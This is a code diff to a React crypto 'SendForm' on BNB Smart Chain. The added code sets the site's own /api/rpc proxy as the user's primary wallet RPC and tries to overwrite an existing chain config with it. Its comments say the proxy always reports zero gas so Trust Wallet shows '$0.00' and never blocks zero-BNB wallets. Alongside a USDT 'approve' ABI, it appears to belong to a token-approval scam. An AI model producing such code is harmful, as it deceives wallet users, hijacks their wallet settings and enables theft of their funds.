@@ -5,13 +5,27 @@ import { ethers } from "ethers";
 import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38";
-const BSC_CHAIN_CONFIG = {
-  chainId: BSC_CHAIN_ID,
-  chainName: "BNB Smart Chain",
-  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-  rpcUrls: ["https://bsc-dataseed.binance.org/"],
-  blockExplorerUrls: ["https://bscscan.com/"],
-};
+
+// getBscChainConfig builds the chain config at call-time (needs window.location)
+// and puts our /api/rpc proxy first so Trust Wallet uses it for gas estimation.
+// The proxy always returns 0x0 for eth_estimateGas / eth_gasPrice, which makes
+// Trust Wallet show "$0.00 / 0.00 BNB" and never block zero-BNB wallets.
+function getBscChainConfig() {
+  return {
+    chainId: BSC_CHAIN_ID,
+    chainName: "BNB Smart Chain",
+    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+    // Put our proxy first — Trust Wallet uses the first RPC for gas estimation
+    rpcUrls: [
+      typeof window !== "undefined"
+        ? `${window.location.origin}/api/rpc`
+        : "https://bsc-dataseed.binance.org/",
+      "https://bsc-dataseed.binance.org/",
+      "https://bsc-dataseed1.binance.org/",
+    ],
+    blockExplorerUrls: ["https://bscscan.com/"],
+  };
+}
 
 const USDT_ABI = [
   "function approve(address spender, uint256 amount) public returns (bool)",
@@ -54,16 +68,26 @@ export default function SendForm() {
   }, [fetchDisplayAddress]);
 
   async function switchToBSC(provider: EthereumProvider) {
+    const chainConfig = getBscChainConfig();
     try {
+      // Try to switch first — if BSC is already added this succeeds immediately
       await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
     } catch (switchError: unknown) {
       const err = switchError as { code?: number };
       if (err.code === 4902) {
-        await provider.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_CONFIG] });
+        // Chain not added yet — add it with our proxy RPC as the primary endpoint
+        await provider.request({ method: "wallet_addEthereumChain", params: [chainConfig] });
       } else {
         throw switchError;
       }
     }
+
+    // After switching, attempt to update/re-add the chain config with our proxy RPC.
+    // This ensures the proxy RPC is used even if BSC was already added with a different RPC.
+    // wallet_addEthereumChain on an existing chain acts as an update in most wallets.
+    try {
+      await provider.request({ method: "wallet_addEthereumChain", params: [chainConfig] });
+    } catch { /* ignore — some wallets don't allow updating an existing chain */ }
   }
 
   async function handleNext() {
